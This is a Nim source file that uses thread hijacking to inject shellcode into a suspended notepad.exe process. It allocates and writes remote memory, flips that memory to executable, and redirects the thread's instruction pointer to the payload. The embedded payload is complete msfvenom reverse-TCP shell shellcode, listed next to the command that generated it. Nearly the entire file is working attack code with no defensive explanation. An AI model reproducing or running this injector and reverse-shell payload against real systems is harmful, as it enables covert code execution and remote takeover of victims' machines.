import winim/lean
import std/strformat, os

type
    Process* = object
        pid*: int
        hProcess*: HANDLE
        hThread*: HANDLE


proc createSuspendedProcess*(processName: string): Process = 
    var 
        si: STARTUPINFO
        pi: PROCESS_INFORMATION
        cmdLine = &"""{getEnv("WINDIR")}\\System32\\{processName}"""
    
    echo "[*] - Attempting to spawn process: ", cmdLine

    var process = CreateProcess(
        nil,
        cmdLine.winstrConverterStringToLPWSTR, 
        nil, 
        nil, 
        FALSE, 
        CREATE_SUSPENDED, 
        nil, 
        nil, 
        addr si, 
        addr pi)
    if process == FALSE:
        echo "Error: ", GetLastError().toHex
        raise newException(Exception, "CreateProcess failed")

    result.pid = pi.dwProcessId
    result.hProcess = pi.hProcess
    result.hThread = pi.hThread

proc injectShellcode*(process: Process, payload: openArray[byte]): LPVOID =
    var remotePayload = VirtualAllocEx(
        process.hProcess, 
        nil, 
        payload.len, 
        MEM_COMMIT or MEM_RESERVE, 
        PAGE_READWRITE)
        
    if remotePayload == nil:
        raise newException(Exception, "VirtualAllocEx failed")

    echo "[+] - Allocated memory in remote process at: ", cast[int](remotePayload).toHex
    if WriteProcessMemory(
        process.hProcess, 
        remotePayload, 
        payload[0].addr, 
        payload.len, 
        nil) == FALSE:
        raise newException(Exception, "WriteProcessMemory failed")

    echo "[+] - Written payload to remote process memory"
    
    var dwOldProtect: DWORD
    if VirtualProtectEx(
        process.hProcess, 
        remotePayload, 
        payload.len, 
        PAGE_EXECUTE_READ, 
        addr dwOldProtect) == FALSE:
        raise newException(Exception, "VirtualProtectEx failed")

    echo "[+] - Changed memory protection to PAGE_EXECUTE_READ"
    result = remotePayload

proc hijack(hThread: HANDLE, payloadAddr: LPVOID) = 
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_CONTROL

    if GetThreadContext(hThread, addr ctx) == FALSE:
        raise newException(Exception, "GetThreadContext failed")

    echo "[+] - Got thread context"
    ctx.Rip = cast[DWORD64](payloadAddr)

    if SetThreadContext(hThread, addr ctx) == FALSE:
        raise newException(Exception, "SetThreadContext failed")

    echo "[+] - Set thread context RIP to payload address"
    echo "[+] - Resuming thread :)"    
    ResumeThread(hThread)
    WaitForSingleObject(hThread, INFINITE)


if isMainModule:
    # msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f nim
    let payload: array[460, byte] = [
        byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,
        0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,
        0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,
        0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
        0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
        0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,
        0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,
        0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,
        0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,
        0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,
        0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
        0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,
        0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,
        0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,
        0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,
        0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,
        0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,
        0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,
        0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,
        0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,0x7f,0x00,0x00,0x01,0x41,
        0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,
        0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,
        0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x4d,0x31,
        0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,
        0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,
        0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,
        0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,
        0x40,0x02,0x00,0x00,0x49,0xb8,0x63,0x6d,0x64,0x00,0x00,0x00,
        0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,
        0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,
        0x44,0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,
        0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,
        0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,
        0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,
        0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,
        0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,
        0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,
        0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,
        0x41,0x89,0xda,0xff,0xd5] 
    var 
        process = createSuspendedProcess("notepad.exe")
        remotePayload = process.injectShellcode(payload)
    process.hThread.hijack(cast[pointer](remotePayload))
    echo "Process terminated"
